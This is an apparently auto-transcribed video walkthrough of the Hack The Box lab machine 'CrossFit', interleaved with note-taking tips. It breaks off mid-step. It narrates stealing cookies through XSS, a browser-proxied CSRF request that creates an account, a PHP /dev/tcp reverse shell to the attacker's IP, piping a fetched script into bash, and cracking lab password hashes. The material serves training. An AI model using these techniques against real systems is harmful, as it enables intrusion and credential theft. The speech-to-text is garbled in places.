 what's going on youtube this is ipsec and we're doing crossfit from hack the box and i really like this box because it is an insane box but it isn't insane because of just the technical knowledge required to do this it's more so just a bunch of hidden gems that's like oh my god i didn't know this existed so for example it starts off with a cross-site scripting where you can verify it does exist but you can't really get any useful information out however if you did a dns brute force of this box through standard methods you don't really get any sub-domains however one of the security features within cores the origin header actually enables us to brute force subdomains so it's not a virtual host you just do kind of how a virtual host brute force works with subdomains except instead of hostname or host header you do it in the origin header and you can get subdomains it's really awesome you do a bunch of cross-site scripting in this box then as the hank user you find some devops artifacts and then as isaac you exploit a php script and then once you get on as isaac there is a custom binary that isn't doing a buffer overflow it's just finding a way to abuse its logic so with all that being said let's jump in but before we get started with the nmap i want to do something a little bit different and install a good note-taking application called obsidian because i've been working with oxdf lately who doesn't use this application i think he just does everything in typora but he's just amazing when it comes to taking notes by the time he finishes the hack the box machine his blog post is almost done because he's just taking such good notes as he goes so it really inspired me to take better notes i looked up some applications that are better than like my old cherry tree or whatever i used and i came up with obsidian so that's what i'm going to be showing here but hopefully by me taking better notes it teaches you how to take bad notes and we can all just take better notes together so i downloaded obsidian and i'm putting it in dot local dot bin and then we can make this uh executable and then go over here and let's just launch obsidian and then this is going to ask us to create a vault so i'm going to create the vault we'll call it hack the box and then the location of the vault is going to be htb and we'll call this obsidian and then click ok and hopefully there's no boxes that ever launch on hack the box code obsidian because we'll have a naming conflict but now that we have this we can just go over here do control n to create a new note um actually i want to do a folder first i'm going to click the folder icon because i don't know all the hotkeys i'm going to call it crossfit and then this note i'm going to label it um i'm going to start at 10 and this will just be comment enumeration and we'll put this in the crossfit folder and we start out with and map so let's go and unmap this box so we'll do sudo and map sc for default scripts as v enumerate versions oh a output all formats bring the nmap directory and call it crossfit and then the ip address which is 10 10 10 208 but this can take some time to run so i've already ran it looking at the results we can see just three ports are open we have 21 which is ftp and based upon the scripts this is weird um there's a ssl on ftp which is pretty unique uh we have ssh on port 22 it tells us it's a debian box and then we have good old http on port 80. so what i'm going to do is copy this whole thing i'm going to go under the nmap directory i'm going to put three backticks and then type bash and that's going to be the syntax highlighting the very first line there and then three backticks and that executes my code block i'm going to hit control plus a few times to zoom in for you all and i'm also going to take some notes here so we're going to say ftp over ssl um http is on a default page and the host is going to be where's the debian right here so we'll just copy this and paste it and the default page on http i just got here we can see http 2 title or http title apache 2 debian default page so we got all that with nmap so now let's go and take a look at that ssl on ftp so if i just do telnet 10 10 10 208 on port 21 uh it looks like ftp works um what let's see hold on can i control x out of this uh control character that exit quit there we go sometimes it's so hard to exit commands let's try ftp 10 10 10 208 and we'll try logging in with anonymous anonymous and log in incorrect so i'm going to try open ssl client to see if this actually is listening over um ssl as well so s client dash connect 10 10 10 208 port 21 dash start ttls ftp uh is it start tls yeah start tls ftp and we get the certificate so looks like it's listening both over regular ftp and some ssl ftp so what i'm going to do is copy this and we'll also paste this below so grab ssl banner ftp put it as bash again and i'm just going to put dot dot snip dot dot dot to let me know i truncated this output and then if we click on this preview we can see exactly what it looks like so we have nice pretty syntax highlighting um i'm going to do to indents and do common whoops enumeration so the idea of doing that is i'm going to create many pages here and then we're just going to cap them all into one but this just helps me organize a bit better so we have grabbed the ssl banner via ftp and we can see the common name is stir.crossfit.htb and we also have this info at gymclub.crossfit.hdb so what i'm going to do copy this i'm going to do new note and we'll start at 05 and say loot and this will be um let's see loot emails and we got that email already and that's from the ssl certificate so we have two things we can add to our host file if we went straight to um 10 10 10 208 we would see this is the apache default page we could run a go buster here but we do have two domain names to try so let's copy this the gym club hdb and we will sudo vi etsy host and do 10 10 10 208 paste that then paste regular at crossfit.htb okay so now when we go to crossfit.htv what do we get uh yes take me there still the same apache page let's try gym club and what do we get we get a web page so what i'm going to do here is we'll take a screenshot i think it's control shift print screen nope control print script print screen actually let's just take a step back and install a different application to do screenshots and make it a bit more intuitive so what i'm going to do is sudo apt install flame shot which is just a pretty cool screenshot utility and then once this is installed we can go over to system control center search for keyboard and then go over to keyboard shortcuts and we want to um i'm going to delete the one i have for it so i can show you creating it so we can do file name the name is flame shot and the command we want to do user bin flame shot and then gui which is the argument and then do apply and we see flame shots here it's disabled um i'm going to double click on disabled and hit print screen and now we should have flame shot running and what flame shot allows us to do as soon as we hit print screen this thing pops up and it's really nice because we have various options we can do with it like use a pencil to write add text to it blur things and everything so what we want to do is just send it to clipboard so copy this selection to the clipboard and then we can go into a notes common enumeration and say something along the lines of um gem club virtual host and paste this what i'm actually going to do instead of putting this under common enumeration i'm going to create a new note we'll do 11 and we'll call this web pages and put this under crossfit instead of 11 i'll do it 15. i always like splitting numbers up so if i want to put something between loot and common enumeration i can easily do that so we'll say virtual hosts and this will be gemclub.crossfit and we can paste that and if we go over to our preview command we can see it and if for some reason you wanted to split the pane you can always do it vertically and then view it like this and interact with them multiple times like that so now we have the gym club so what i want to do is go over to go buster and we're going to run a go buster on this so go buster i'm going to do virtual host because we already have one host and that ssl certificate has star dot crossfit.hdb so i'm thinking there's probably another host on here so i'm gonna do go buster v host and then we wanna do dash u htp crossfit.hdb and dash w for word list uh op sec list discovery dns i'm going to do subdomains top 1 million we'll do 20 000. i'm going to first do dash v so i can see all the host it's brute forcing and we can see images.crossfit.hdb which looks good so i'm just going to run this and we'll do dash o and i'll make a directory go buster and we'll do go buster v host dot out so now we are running go buster and we can take a look at the website so at gymclub.crossfit.htb and whenever i look at websites there's a few things i look for usernames uh emails and just where user input is the main three so scrolling around at the very bottom we have this info at crossfit.htb which i think is in my loot already so we don't need to take note of that and it doesn't look there's any user oh wait there's a contact us so we can say uh let's go up like that and then go back here and let's do a new note 20 and this will be gym club and we'll put it in the crossfit directory webpage this will just be gym club and we'll call this user inputs the very first one is going to be index and let's do flame shot so print screen and we will copy this i always like grabbing the url and we can grab this and circle it as a contact form and then copy selection to clipboard and we can paste that there and let's see if there's any other places we can do user input so if we click around on this calendar it doesn't look like we have any links to go to i was hoping maybe we could book an appointment or something the about us page looks like we have a few names so let's put all these names in our notes so go to loot and i'm going to put instead of emails people and let's copy these names becky taylor i don't know if i needed to copy all of those uh noah yeah i don't know why it's copying all that then evelyn fields and then the last one leroy guzman so we got a list of people now on this page it's nothing really else on this so let's go take a look at the next thing which is schedule and let's see if our go buster is finished it is almost done so i'm going to get ready to start the next one so go buster d-i-r-u http gym dash club dot crossfit dot hdb dash w for word list hop set list discovery web content raph small words dot text dash x for arguments php go buster slash gym club dash root and start this go buster up we have no new host here so what i'm going to do is go back to common enumeration and say we did it so netmap go buster did not return anything and if we wanted to we could be diligent and put the command here bash paste um it always should end newline three backticks there we go so where were we we're still looking at user inputs so scrolling down this page don't really see anything there is this book now but can't really click anything the gallery looks like we got pages but nothing here if we went deep into these we could potentially find more usernames but not too interested in that right now main thing is just looking for user input so if i do show 1929 i was seeing if this would change up here to be like an incrementer and if this was like page two of three if this would do question mark page equals two or something but i don't see that so let's go to blog details scrolling down we do have a leave a comment so you guessed it let's take a screenshot copy this send it to clipboard and this is log single dot php paste and nothing else here so let's go to contacts see what we have there is a get in touch and we got this email here so let's go back to loot email paste this that is a different email than we had before and take a screenshot of this one so we have three different places we can have user input let's go back to obsidian gym club contact dot php and paste this let's go back to our go buster we're about 18 done so nowhere near finished we'll just keep that one running and play with these contact forms so let's get in touch test test gmail.com and let's just try basic cross-site scripting so script source http 10 10 14 4 slash test.js slash script and we probably should make these hit our web server so python3 dash m http.server port 80. and instead of doing test.js i won't know if like which page got hit so i'm going to do contact dot php i guess so if someone if this cross-site scripting works and someone hits a web server we'll know because this will say contact.php so we send that and your message was sent successfully let's go to blog details do the same thing except this will be blog single and name test root at ipsec dot rocks and let's do 867 5309 i'll put three fives for the area code first comment and we have a cross-site scripting attempted so this is weird um test root i'm just doing this for the screenshot to put it back and we'll do print screen copy copy to file let's go obsidian new file 25 gym club xss and let's see let's name this one cross-site scripting attack and we'll say detection and paste the screenshot and upon sending script let's just say xss payload 2 blog single dot php [Music] this error is displayed i always try avoiding like personal things like we i whatever i always just try to avoid that because it's just cleaner writing if you don't so we have this said and let's see a security report containing your ip address and browser information will be generated and our admin team will be immediately notified if we look at a web server we still don't have anything so let's be thorough and do the very last cross-site scripting one to see if anything does hit i think it was on the home page index at the very bottom there was a contact right here uh we'll call this index and test 555-867-5309 and we sent that in so we don't have anything um i'm going to open up suite and one of these times i'm going to learn zap because my professional expired and i don't feel like renewing it so we'll switch to zap eventually once i learn all the hotkeys and everything but for now community burp is fine so we don't have to update for this all i want is the repeater tab so it's starting the project there we go and hopefully my font size is i want it bigger don't i uh window no user options display change font let's go to 16 for you all there and we'll do 14 in this there we go that looks fine so now let's send this to burp suite so go up here prep suite and let's see intercept is on post comment send go to the repeater tab and notice the message a security report containing our ip address and browser information well we can't really change our ip address easily but we can change what the browser information is so let's go over here and user agent let's do script source is equal to we'll call this useragent.php and we send that if we go back here we have a get on useragent.php which is good so we've now confirmed that the user agent of whoever the page someone goes to to view security reports is cross-site scriptable itself within the user agent so they probably have some type of filtering here because they detected cross-site scripting on user input and then that field goes so this goes somewhere into the application and there's a report that's generated and like here's this user input it's cross-site scripted we know this was malicious so we did sanitization here so you can't get infected however they did not expect the user agent to be manipulated by the user and on the page that is getting viewed the user agent is also there so we can put cross-site scripting here one of the things i love doing with crosstalk scripting is just making it a chain i don't like typing a bunch of cross-site scripting up here instead i want to make it load a javascript off of my box and that just lets me edit it much easier that would make more sense in a second but let's create this screenshot to show this worked and instead of using python i want to do um netcat on port 80 and this is going to let us capture the uh user agent so we're going to send this and it should make a request any second and we can see user agent this so i'm going to go back to my print screen command i was debating if i wanted a print screen or um just copy and paste but i want to get my sweet window in as well so let's print screen go back to obsidian and say uh initial poc paste that that looks good and then at the very end we can go and add text here to make it look pretty but we don't want to note taking process to slow us down too much we got the screenshot the hard piece so we can move on and type later so that is there let us create a um www directory so make dirt dub dub dub we're going to start the python web server back up here and we got xero.js so the very first javascript i want to do is just a document.location to see if i can steal their cookies so http 1010 14 4 slash plus document.cookie okay so now if they have a cookie and view this page we should be able to retrieve it so got xero.js but it did not go oh i don't think that's valid i think it's just document.cookie there we go uh so if they had a cookie here this is where it would be after this and since it just went to slash there's no cookies for us to steal or they're marked secure something and won't send it this way so we have some more like uh things to do here because we have cross-site scripting but we don't know what we can do with it if we go back to our go buster it is still running and we went through the website if we go maybe burp site map i don't know what i was trying to show there but we don't know what we can do with this classic scripting so i'm assuming there's going to be something we can do to enumerate other subdomains we did go buster and it came up with nothing but if we look at the repeater let's just make a get request that's empty real quick so get slash like this we can get rid of the virtual host routing so we can just call this crossfit or it doesn't even have to be a domain name 10 10 10 208. uh what git slash there we go one at all caps that's weird but this is the apache default page but we can see it is allowing oh because we have this origin so even though we did this um host 10 10 10 208 because we have this origin set this access control allow origin line is set validating that this is the domain name so this is something called cores and it's just a browser security mechanism i think it's crossed origin request security but if we put a invalid name in here we don't have that one line we have this allow credentials true but we don't have it of saying what the subdomain is and we can put other subdomains like admin and we don't have anything so we have another way we can brute force the domain name is through this course origin header because upon a valid header this page will give us a different header of saying it's valid so if we do again gymclub.crossfit this is the header we want to look for so let's go back and do a second um subdomain enumeration this time with the origin header instead of the host which is for virtual host so let's go back here to this pane gearbuster is finished and to do this i'm going to use fuff and the main reason why i'm switching to fuffins over wfuzz is hack the box has a nice academy that teaches you how to use all these cool tools and do some like advanced things with them that um aren't too intuitive so i'm doing opt fuff opsec list discovery dns we'll do the sub domains let's do top five thousands of twenty thousand um dash u for url http 10 10 10 208 dash h we want to add the header so origin http colon slash fuzz dot crossfit and then we want to dash m r and that's not magic resist that is match response so if we do f h you can see the match options and this is like um hi to show in wfuzz language but like we can match the code the amount of lines match regular expression not response regular expression uh size and words so we want to match a regular expression for um what is it go back to our burp suite this we want to find any request that has this line in it and i'm going to add the dash dash or i think it's dash one or one dash ignore body because i don't want this whole request looking through the body which is this bottom piece it can just take a little longer so let's see what this fuff command goes with and right off the bat we have ftp with a hit so i'm going to copy this and i guess we could wait till it's done because it's gonna be done in a second we can copy this whole command and then i'm gonna go back to comment enumeration i'm going to go down and say subdomain brute force via course and then same thing and then if we view this syntax um there's a piece i don't like i don't like how it's not highlighting all their arguments because i didn't put them in quotes so i'm going to clean that up so if i just go and for you i will split the screen vertically so you can see exactly what i mean so right here if we go down and edit this and put this in quotes you can see now this piece is highlighted i'm going to do it for the next one so if we just put quotes here now our command looks a little bit prettier okay and we have a subdomain ftp so let's go and add ftp and we got www.ftp so sudo vi etsy hoose and we can do ftp.crossfit.hdb and when we try to navigate to that page you just get this apache page and that's not a surprise because i mean we already brute forced that with the go buster what i'm going to do is try adding this origin and seeing if that does anything and to show you exactly how it detected again if we do ftp.crossfit.htb we get that line so let's go and edit a proxy or edit the request by intercepting and then we'll paste the origin in forward we still get this but coors is what allows one web application to access another one so what if we made a cross-site scripting payload and um actually like use their browser to proxy a request back to us so if we went back to our initial cross-site scripting payload this this is very rudimentary we're just making the browser make a request to us if we use um the xml http request we can make the browser go somewhere and then return the response to us so i'm gonna do vi1.js i'm gonna do ver target is equal to http ftp.crossfit.htb and this needs to semicolon at the end i think i'm gonna do ver request one is equal to new xml http request and if this confuses you i did this a long time ago in the holiday video that's the one i always go back to so request one is equal to open this is a get request i'm gonna do it all capitals because didn't do that in book and something weird happened and then this last one this is async if this was true then it would move to the next line immediately and process it but it being false means this is a blocking command so it won't move to the next request until this one finishes so rec1 dot send and then we want to capture the response so viral response is equal to request1.responsetext and now we want to open a second request and this goes back to us so vireq2 is equal to new xml http request and then request2.open and this is going to be a get request we could do post and that would be cleaner but i'm just going to get back to us because it's less code on our end to handle it i'm going to do plus b2a which is base64 to this converts it to base64 i forget what it stands for um but yeah b2a response and then this one we can just say it's true it doesn't matter what that is rec two dot send that looks good it's probably not going to work the first time because i'm known to make typos but if we go back to our repeater and let's go and edit our payload to say hey go get 1.js and then wait we got one and we got some text right away awesome so i think that worked so let's see what this looks like so let's do vi or let's go dub dub dub index.html uh echo dash n paste the base64 base64-d index.html and we can do firefox index.html to see what it looks like if we wanted to and there is this create new account which is accounts create so we got a list of usernames and potentially a way to create an account so let's try stealing this accounts create page so i'm going to wait would i create this am i just in root i am move star.js to dub dub and let's go up here and dub dub dub so we don't expose all of the notes to anyone who hits our box so go into dub dub dub copy 1.js to 2.js v2.js and we want to steal this slash accounts create page now and go to brepsweet 2.js send it and we get a big piece of text i'm going to make dur dash p accounts uh i don't know why i did that let's just do vi create.html i was going to try to like clone the page but this is easy enough it was account okay and we can look at create.html or we could just again firefox to open up create.html and we can see it's got username password and if we inspect the source there is this um csrf token so we have to grab this token if we want to send a response and it needs username and password so the main thing we have to do is get this csrf token so i'm going to copy 2.js to 3.js and we're going to grab this request so we are already there and then we want to say uh ver parser so we're going to purse this document is equal to new dom purser and then we're going to do a bird doc is equal to our parser.purse from string response and we're going to tell it it's html document and response is rec1 dot response text then the next thing we want is var token is equal to doc dot get elements by name and it's underscore token and it's the very first one we want to get this would return a array and that's what we want so for this i'm now going to return token because i just want to make sure this works so if we go to burp suite send the request and we wanted 3.js go back here it looks like that worked this looks like a token let's send another request and yep we are getting tokens so let's just exit this pane v3.js so now we want to make them do a second request so they're still going to go to the target so this will be um what is it http ftp.crossfit.htb where is the post so we got form it sends a post to slash accounts so slash accounts and we don't have a token so the next thing we have to do is create parameters so params is equal to username is equal to ipsec um i think it was pass is the next variable yeah name pass pass is equal to please subscribe and underscore token is equal to plus token that should be good we can move this request down and we can say this is now a get it's a post and we actually have to modify this a little bit because if we don't do this it's not going to keep the session so what we want to do to keep session is go up here and we want to do rec1 dot with credentials is equal to true and we want to do it down here as well [Music] so rec2 like that and then we need to set the request header and that's going to be content type and it is a application slash x www form url encoded document the mime type for just a regular html encoded document and now we can do rec2.send params and there's parameters or these up here and then we can say ver response to is equal to rectu dot response text and we can send it back to us so let's cat 2.js to grab this and send it but this will be three okay so if this works um we should be able to get a user created on this box so let's send this and modify this to be 4.js and it got 4 but it didn't progress oh it's 3.js i think it didn't progress because that was a 404 error three 200 and nothing so let's take a look at this file we can probably ignore this whole top part because that has worked uh this bottom part has worked but i'm noticing one thing right now we're not in async mode so let's or i don't know if we are whatever um it's not blocking so this one will return before this can finish and i'll leave that as true just to see if we have anything and what type of error message this creates and i'm looking at the next we do have rex 3 here so we just want to put that as rec 3 and then i'm looking at the response we're not doing response 2 we're just doing response 1 so we can change that and i'm going to let this run but again i don't know if this is going to work because this one is set to true so let's just see what happens if i go back so we have our python let's go send and we're gonna get three in a second come on there we go and it just gets slash because response doesn't equal anything yet so let's change this to be let's see rec2 change this one to be false and see what happens uh send and we get a bunch of stuff so if you're curious how you find that type of stuff because it may be like black magic of me just changing random variables that aren't labeled if we go to like new xml http request open so let's do xml http request open i'll probably have to turn this off burp suite and here is the man page if this loads and we can see method url and then async and it's telling us what this is if the value is false the send method does not return until the response is received so that's why i kept me about it's being blocking but we have this now base64 let's take a look at it uh oddly enough it's oh 404 because of our python request module so let's copy this i know if i could have just copied it with the mouse if i would've been faster so let's do echo dash n echo dash n control shift insert oh no i can copy mux not bad b64 dash d now we can paste this to response.html and go firefox response.html and it's just an error message um 500. i wonder if that means access denied um let's see if we can log in so let's do lftp and then we have to set ftp ssl force to true then set ssl verify dash certificate to no and then we can connect 10 10 10 208 log in with ipsec login ipsec password of please subscribe and do a dir it works so we have an account now and oddly enough we have a few things we have development dash tests which i haven't seen before ftp gym club and html this looks like the verb dub dub dub directory um it doesn't really look at it but just based upon it being html and then a few virtual hosts i'm assuming this is so let's go back to our notes that we've kind of neglected for a while so we'll have to clean these up subdomain brute force and then we also have um sub domain bound via ftp uh this one one two whoops i wanna insert am i doing three or two here two uh just going to copy this whole thing we'll do bash paste like that and and let's get rid of the second pane makes it easier for me to read so we have a few sub domains before we go into this i want to catch up my notes so i'm going to go to a new pane let's cat xero.js uh go into www cat 0.js this is document location did we put that in our xss no uh yeah we have not so what we can do is copy this and we're gonna do three backticks javascript because this is now javascript and check browser so what this one did it didn't return a cookie whoops but it did um display we had javascript execution so the very next one this is where we went into the xml so cat1.js and i'm going to try x clip dash selection primary does that work javascript no that did not let's see dash selection clipboard there we go so this next one would um didn't return a cookie so get ftp page used xml http request to return a page okay then the next thing we have to do is go you guessed it go to two paste this and this is going to be uh this one tested tokens i'm going to label this like that wait oh this one got the accounts page and i'm not sure we have the playing with token one we probably deleted that do i have a four yeah i delete that creating a user javascript based okay uh grabs token on accounts create to create an account there we go so now we're all caught up on documentation already that only took probably three or four minutes but that will definitely save us time down the road if we ever have to explain what we did so now we're in this um let's go to cd html and what directory was i in i was in dub dub dub so i'm just trying to put xero.js in these directories to see if there's anything we couldn't create file in html let's go to gym club put xero.js access failed let's do a dir we can get db.php i was just looking for like a config or something like that cv dot dot we can also dir html to see if there's any goodies in there but there's just the index so let's go to ftp and put uh was it zero.js we're trying with could not create file we have this and this is laravel if we do diy dash a there is a dot env so we can get the dot env there's also a dot get directory so we have that let's go and the dash a meant uh show all files which includes hidden development test and put xeo.js and this one actually transferred so let's go out of that and let's create ip.php php system and we'll do bash dash c dash dash was it like that dev tcp 10 10 14 4 slash 9 that's a 1. like that okay and we can put ip.php nclvnp9001 and we have to probably edit our host file so sudo vi etsy host and this will be uh ftp we already have that so we can just go ftp.crossfit.hdblaship.php and we get uh not found so the next thing i want to try doing is editing the xero.js and just forcing their web browser to hit this so we could have even done it with script but it doesn't really matter so ftp crossfit.htb slash like that save it and we also need python3-m http.server on port 80 and we can go back here and tell him to get 0.js so we should see 0.js and it doesn't look like it worked if i do a dir that still exists oh it's i'm sorry um it's development dash test so sudo vi etsy host development dash test.crossfit.hdb there we go and we can try accessing it here development dash test uh hdp not found so we can go back to zero.js did i copy the whole i think i copied this whole thing there we go and we get zero.js and get a shell so what we want to do is show that we can do this so what i'm going to do is go back here and this looks good actually yeah we'll leave 0.js so grab this copy obsidian so we'll create a new one 30-gym [Music] we'll do ftp let's just paste bash and then the next one is zero.js we don't need that um we can just do if.php and copy this and the reason why i just didn't do like system argument is because this is actually more secure when you're on an engagement it kind of gives away like it's worse opsec because you're hardcoding an ip but no one else can really abuse that shell because the ip address is something i own if they guessed how i did like arguments in my parameters then i would well if someone found it they could potentially reverse the script and exploit the client so created in was it 25 gym club crossfit so that just creates a link and this is one of the cool things about this application if you do create links between your documents let's say you had one link that had a bunch of um like cross-site skip scripting references it gives you like a mind map and links the two so it's pretty cool i don't know if i'd use that feature too much but it is there so we have those two and with this shell see where am i to unzoom there we go so let's get a better shell so let's do python python3 dash c import pty pty dot spawn been bash awesome control z stty raw minus echo fg enter enter i know it doesn't show anything when you type those things because you removed echo from sdty and then let's do export term i think it's all caps is equal to x term and now i can clear the screen awesome the first thing we probably should do is run lin p's so let's go and back in our www directory let's do a cp opt privilege escalation awesome script suite win ps linps.sh to our current directory python3 dash m http.server and i'm also going to try something i don't know if it's going to work or not so let's do nc lvnp 9002 and we'll direct this output to lynn p's dash dub dub dub dot out and what we're going to do is curl 10 10 14 4 port 8 000 lynn p's dot sh and t it to dev actually before we do this let's fix up our tty a little bit more so let's see i'm going to go to a new pane split like that that's the size i am and we can do stty dash a so we need to remember 16 and 36 so stty rows 16 columns 136. i think it's just calls there we go so now i can start typing that when piece command so curl 10 10 14 4 port 8 000 slash win ps dot sh pipe that over to t and let's try dev tcp 10 10 14 4 port 9002 i have no idea if this is going to work this is exciting uh no oh i did not bash bash like that let's i see if i should put t here it's not connecting so let's try cat dash to dev tcp 10 10 14 4 9001 connection refute so doing 9002 i did so cat like that and let's do 9002 i have no idea if this is working it doesn't look like it is let's see tail limp peas maybe it will at the very end um this isn't a t so i'm not going to see output as it comes it's just going to magically stop potentially and the reason why i want to send it here is because i'm going to have a pane copying this whole output into a clipboard so if this was a file i could easily copy it let's see while that runs we can test so cat dot to let's just do test echo hello cat test it's not going to work so let's go back here escape out we cat limps didn't get anything so i'm going to t this and instead of this cat command and if this one doesn't work i will probably just um switch it up and uh write it to a file there we go typing it to nc helped i don't know why t didn't work it seems very similar to what i did with t so we'll just look at this for the output um if we go to the top what do we have nothing too interesting the software we have on this box interesting shells so you can see my reverse shell so let's see let's go back to where it left off where is it okay so binary process permissions nothing interesting files open belonging to other users cron jobs um let's see there is an etsy cron tab i don't know if it's outputting the data of etsy cron tab that looks bigger than i'm used to saying and it's got this encore cron tab this is actually really cool um in cron tab is like a crown based upon files so you can do file name space and underscore modify space script and when that file is modified it would go and run that script really cool weekly oh here we have something a cron so i'm going to say this will be 35-shell let's see we'll do dub dub dub data and let's do lin p's so show as www data and peace uh let's just do bash for syntax highlighting crop tab looking back systemd path service files http sockets nothing too interesting yet login now so we have users log into the system we have root isaac ftp adm and hank so that could be interesting so we can copy this and paste it over see wp cookies apache server info so we could look for more virtual hosts since we've found three now and all of them didn't appear in our go buster brute force looking at ssl ssh files nothing too interesting looking for specific config files like cabana vault 80 cached things like that screenshots tmux sessions this is a pretty robust checking script so containers vulnerable interesting files specific caches inside of files so we have two hashes right now so let's copy this whoops copy paste and it's got limit 70 so i'm going to oh shoot i control seed oh i think i was done so if we less len p's www.out or less i think dash capital c for color uh there's a way to get color i'll put in less um let's just do a vi this saved weird shoot this is not good um man less [Music] color ansi color escape sequence ansi dash dash color maybe yeah because of how we outputted this all these antsy characters are in and it made limpies a horrible mess um yeah that's not great oh well that's a problem for another day we have a few things we can go off of and then we'll run lin peas again normally uh let's clean this up so this way we can put notes around each but we have two hashes right now we can play with so well we got this cron so we can see if we can go in home isaac and see what this is cd uh how do i i don't like how it's highlighted oh well home isaac something we control c out of send updates and we have commission denied so we can't go in here just yet to see exactly what the script is but we know it is running constantly and we know isaac logs into the system we do have specific hashes inside a file so we have add user hank and user factory if i do a ls-la on send updates the group admins can go into that if we do a group admins command or groups is it groups admins uh let's just do v etsy group and let's go to admin and we can see admins is isaac and hank so if i did groups hank it would have shown the members he is but this etsy group file is great at showing all the groups and who they're a member of i know there's probably a way to list the members of a group with a command but unfortunately i don't know everything on these things so let's go and back to a brute force and this is a sha-512 crypt and this is md5 crypt um what i'm actually going to do even though this hash isn't useful to us i'm going to try cracking this hash with rocky first because if it is like a password reuse scenario then i mean this will crack much faster than six so let's go over to the kraken ssh kraken and this is just a box i have because i don't like using cracking on like the computer i'm recording from because it's such a cpu intensive process or gpu intensive process also i recommend doing on your host if you don't have a specific box don't do it within a vm so let's do vi hashes slash um the host name which is crossfit md5 crypt and we'll put that in and we'll do hashes let's do shop 512 crypt and we'll put this one in we can't crack them both simultaneously unfortunately but we can make it so we have to change very little the hashcat command so i can do hashcat dash dash example hashes less md5 capital c md five lowercase c crypt truecrypt uh let's see is it lowercase md5 let's do grep dash i md5 grep dash i crypt okay so it's lowercase md5 crypt and then i can do a dash b for before so do before five that is mode 500. so dot slash cat dash m 500 hashes slash uh we called it crossfit md5 opt word list rocky.text we'll see what password this is and what uh oh um 2y this is an nd5 crypt i don't know what i was thinking this is bcrypt uh because we got two a character and then this would be like iteration count not sure exactly what i was thinking there so let's go back and we'll look at shot 512 crypt because b crypt is also very slow so shot 512 crypt is mode 1800 so we can go back and we can change this to be sha and we can change the mode to be 1800 so let this crack this will probably take a while um hopefully not too oh no i spoke too soon uh this cracked very fast because it must be near the top of the word list we got powerpuff girls so let's go back here we can say uh hank's password is powerpuff girls cracked and what i'm also going to do is try cracking this bcrypt one because we have it we can run it in the background while we work so why not let's do b crypt to stir something so 3200 so go back to this one and we'll specify 3200 and see what that cracks to just make sure it runs and then we'll move on to the next thing come on hash cat start up uh did it finish what let's do show oh it's password password is always password so that could be like some default password or something just in a library or they have a password set as password so let's try sshing in as hank so ssh hank at 10 10 10.208 and the password of power puff girls and we get in so that is dub dub dub data and i'm going to call this uh to hank uh not use special characters in the file name okay and we can create a new thing 40 dash hank and we can copy this shell as hank awesome so what do we want to do here um i want to get a lynn p's output that is good so what i'm going to do is uh curl 1010 14 4 slash lin ps.sh and we're just going to pipe it over to bash and send it to limpese.out uh we probably have to specify port 8000 okay ssh ink at 10 10 14 10 10. 10 208 and power puff girls if we go back to what we know is if we go here there is a crown that we ran as dub dub dub and hank is a member of admin so let's go cd into send updates uh i went into two directories there we go and let's just cap this file send updates so it's going to include a few but now it's going to do a loop so we have this fs iterator new file system dir for each file it's going to get the path name it's going to select email from users so this is grabbing each row it's going to run the command user bin mail add argument ask crossfit club newsletter escape is equal to true then add row email escape true file get content standard in and then execute so it looks like it's grabbing the row and using a like shell command to execute mail going a bunch of arguments from the database and then executing command and it's using this library my cart l shell command library so let's go and google github and let's see uh my current l was it shell command there we go php shell command so what i'm going to do is look at the issues of this repel and see if there's any security vulnerabilities in it so we look escape ergs is not working properly and here he's saying he's able to get rce with this so escape bergs is set to true but escaping is not happening so let's try this in order to try it though we have to include we have to um get a file because it's looping through each of these files so to figure out what this message dirt is if i can't any of these files i do not have permission to go into them so the includes directory is owned by isaac and vendor is owned by group isaac all these others is a group owned by admins which we're a member of that's why we can see it so let's cat send updates again real quick and copy this and we're going to just put it in our notes so hank php and we can add notes so we don't have permission see unknown directory so since that's another directory we can't loop through it and this is probably probably braunable and this file was we can copy send updates.php send updates.php there we go and then what we can also do is link the github so if we go here paste php shell command as a bug let's do a link there we go if i preview this looks good okay so now we have to figure out exactly um where this messages directory is so let's cat etsy pass wd and see what we have there is a ftp adm under srv ftp we did get a file so way back we go into i think www.env so if i cat.env and db we have well cat db first we have credentials so crossfit uh db pass so if we go here to loot and we have credentials and this will be ssh hank powerpuff girls it may be better to do this as a table i don't know mysql crossfit and let's copy this and let's look at cat.env and go up we have ftp hosting as well to be hosting like that so let's try um let's see cat etsy passwd ipsec oh this is my box we have passwd here so ftp adm has no login but we should still be able to get if it's a valid password or so not just pasted the ftp hosting password oh no that's the crossfit password and let's try ftp hosting paste this in and we get authentication failures so the next thing i want to do is look at ftp hosting so we can do mysql dash u ftp hosting p paste the password and then we can do show databases use ftp hosting show tables select star from accounts select star from failed jobs select star from migrations nothing too interesting there selector from users and we don't have the ftp admin okay let's try the next user which was crossfit and we can look at this hank uh let's see ftp hosting db nothing here crossfit db show databases use crossfit show tables so we got messages so this is looking promising so select star from messages describe messages we don't really have anything describe roles uh we get security report select star from security report nothing selectstar from trainers and the next one is users so trainers doesn't really have anything users and users doesn't have anything so both databases don't have anything and crossfit db no real juicy info okay so the next thing we can do is look at where this ftp user is used so i'm going to cat etsy passwd so i can put them on my clipboard because it's always best to copy and paste instead of type and i'm going to grep ftp adm on slash etsy let's see i'm going to hide error message so to devno and this is all the files ftp adm is in so he's in the vs ftpd user comp etsy group and it looks like we have a pam off with a password so let's try let's put this password in so go to elute i'm going to call this ftp probably and i went to ftp instead of ssh because he has that no login shell on passwd so let's go and back to our ftp command which i don't think we have anymore so we'll have to retype that so let's do that here i'm going to label this hank this will be well we can get rid of this pane because we're not using this anymore this will be dub dub dub data there we go close this close that trying to stay organized as we go so the thing we want to do is lftp do i have ups i do so we need that ssl verify so force verify then we can log in with ftp adm and his password let's put it back from clipboard paste dir we have to connect connect 1010 10 208 dir sending commands waiting for response login incorrect let's try logging in after we connect uh what well again ftp adm dir connecting logging in there we go so you want to log in after you connect and we have this messages directory so i'm assuming this is where we want to be if we do a dir we have nothing so i'm going to touch message and let's v please subscribe to ipsec i'm going to tell them to subscribe to us it always helps so we can put test and before we put test we want to go back to the source code so let's go back to hank let's make this pretty so now we can enter this loop because we have a file so we can enter in here we want to select email from users so we want to put something a command injection in email so let's connect to the crossfit database so let's go back to hank and we can close out one of these shells would i write that i think that was in dev shm lsdev shm no shoot i don't know i wrote my lin p's oh well um you should put lin p's inside of obsidian i'm not going to because i screwed up lin p's twice so mysql dash u crossfit dash p and we want to get over loot table and we want to crossfit user paste use crossfit show tables describe users so this id auto-increments and it's a primary key so we could specify the key or we don't have to because it auto-increments so i'm gonna do insert into oh 